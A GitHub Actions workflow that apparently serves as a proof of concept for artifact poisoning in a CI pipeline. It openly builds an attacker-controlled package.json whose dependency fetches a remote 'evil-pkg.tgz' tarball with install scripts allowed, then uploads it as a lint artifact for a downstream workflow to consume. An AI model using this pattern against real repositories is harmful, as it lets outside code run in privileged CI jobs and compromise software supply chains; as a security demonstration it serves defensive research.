name: Lint
on:
  pull_request:
    branches: [main]

permissions:
  contents: read

jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - name: Save PR number
        env:
          PR_NUMBER: ${{ github.event.pull_request.number }}
        run: echo "$PR_NUMBER" > pr-number.txt

      - name: Simulate attacker-controlled artifact payload
        run: |
          cat > package.json <<'JSON'
          {
            "name": "poc-root",
            "version": "1.0.0",
            "private": true,
            "allowScripts": {
              "poc-evil": true
            },
            "dependencies": {
              "poc-evil": "https://raw.githubusercontent.com/PDFtoMark/gab-poc-adobe-lintbot/main/evil-pkg.tgz"
            }
          }
          JSON
          printf '# Attacker chosen report\n\n![x](https://example.invalid/x.png) posted by artifact\n' > linter-report.txt
          ls -la

      - name: Upload linter report
        if: always()
        uses: actions/upload-artifact@v7
        with:
          name: linter-report
          path: |
            linter-report.txt
            pr-number.txt
            package.json
          if-no-files-found: ignore
